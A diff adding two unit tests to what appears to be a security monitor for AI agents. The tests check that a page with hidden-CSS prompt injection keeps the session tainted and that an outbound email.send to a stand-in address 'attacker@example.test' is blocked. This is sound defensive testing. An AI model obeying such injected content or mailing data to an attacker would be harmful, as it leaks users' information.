@@ -80,6 +80,40 @@ class EDRAndDemoTests(unittest.TestCase):
         self.assertEqual(decision.rule_id, "POL-ACT-002")
         self.assertEqual(run.edr.state, SessionState.NORMAL)
 
+    def test_a_later_clean_page_does_not_untaint_the_session(self) -> None:
+        run = AegisRun("mono-1", _mandate())
+        run.analyze_html(
+            source_id="hidden-css-injection",
+            url="https://fixtures.local/hidden-css-injection.html",
+            html=(FIXTURES / "hidden-css-injection.html").read_text(encoding="utf-8"),
+        )
+        run.analyze_html(
+            source_id="clean-laptop",
+            url="https://fixtures.local/clean-laptop.html",
+            html=(FIXTURES / "clean-laptop.html").read_text(encoding="utf-8"),
+        )
+        decision = run.decide_tool(
+            ToolRequest(
+                run_id="mono-1",
+                tool_name="email.send",
+                action_class=ActionClass.OUTBOUND,
+                arguments={"to": "attacker@example.test", "body": "recommendation"},
+                destination="attacker@example.test",
+            )
+        )
+        self.assertEqual(decision.rule_id, "POL-FLOW-001")
+        self.assertEqual(run.context_trust, TrustLabel.SUSPICIOUS_EXTERNAL)
+
+    def test_state_machine_records_each_transition(self) -> None:
+        result = run_caught()
+        transitions = [
+            event for event in result["events"] if event.event_type == "session.transition"
+        ]
+        self.assertEqual(
+            [event.outcome for event in transitions],
+            [SessionState.SUSPICIOUS, SessionState.CONTAINED],
+        )
+
     def test_only_contained_session_can_be_reviewed(self) -> None:
         monitor = SessionMonitor("run-1")
         with self.assertRaises(ValueError):
